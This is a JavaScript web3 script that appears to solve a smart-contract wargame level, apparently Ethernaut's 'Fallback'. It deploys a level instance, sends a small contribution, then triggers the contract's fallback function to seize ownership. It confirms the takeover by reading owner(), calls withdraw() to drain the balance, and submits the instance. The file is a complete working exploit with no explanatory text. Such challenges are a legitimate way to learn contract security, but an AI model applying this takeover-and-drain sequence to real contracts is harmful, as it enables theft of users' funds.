const {
  web3
} = require('../utils/getWeb3');
const {
  mainAddress,
  levelAddresses,
  deployId,
  submitId
} = require('../utils/contractInfo');
const {
  getAccounts,
  checkLength,
  sendTransaction,
  valueFromLogs,
  encodeMethodIdWithParameters
} = require('../utils/helpers');

var globalValue = {};

const createInstance = async () => {
  console.log('Creating instance..');
  const account = await getAccounts(0);
  globalValue.account = account;
  const levelAddress = levelAddresses[1];
  console.log("deploying....");
  const payload = deployId + '0'.repeat(24) + levelAddress.slice(2);
  checkLength(payload, 74);
  return sendTransaction(payload, mainAddress, account);
};

const initHack = async () => {
  console.log('Hacking...');
  console.log('Calling contribute method');
  const payload = web3.eth.abi.encodeFunctionSignature('contribute()');
  return sendTransaction(payload, globalValue.instanceAddress, globalValue.account, web3.utils.toWei('0.0001'));
};

const callFallback = async () => {
  console.log('Calling fallback');
  const payload = web3.eth.abi.encodeFunctionSignature('doesnotexit()');
  return sendTransaction(payload, globalValue.instanceAddress, globalValue.account, web3.utils.toWei('0.0001'));
};

const checkOwner = async () => {
  const payload = web3.eth.abi.encodeFunctionSignature('owner()');
  const getOwner = await web3.eth.call({
    to: globalValue.instanceAddress, // contract address
    data: payload
  });

  const owner = '0x' + getOwner.slice(26);

  if(owner.toLowerCase() != globalValue.account.toLowerCase()) {
    throw new Error('Hacking failed');
  }

  return owner;
};

const withdrawFunds = async () => {
  console.log('Calling withdraw method...');
  const payload = web3.eth.abi.encodeFunctionSignature('withdraw()');
  return sendTransaction(payload, globalValue.instanceAddress, globalValue.account);
};

const submitInstance = async (instanceAddress) => {
  console.log('Submitting instance...');
  const payload = submitId + '0'.repeat(24) + instanceAddress.slice(2);
  checkLength(payload, 74);
  const account = await getAccounts(0);
  return sendTransaction(payload, mainAddress, globalValue.account);
};

createInstance()
  .then((receipt) => {
    const rawAddress = valueFromLogs(receipt, 'data');
    const instanceAddress = '0x' + rawAddress.slice(26);
    globalValue.instanceAddress = instanceAddress;
    return initHack();
  })
  .then(() => {
    return callFallback();
  })
  .then(() => {
    return checkOwner();
  })
  .then((owner) => {
    console.log(`Contract owner address: ${owner}`);
    return withdrawFunds();
  })
  .then(() => {
    return submitInstance(globalValue.instanceAddress);
  })
  .then(console.log)
  .catch(console.log);
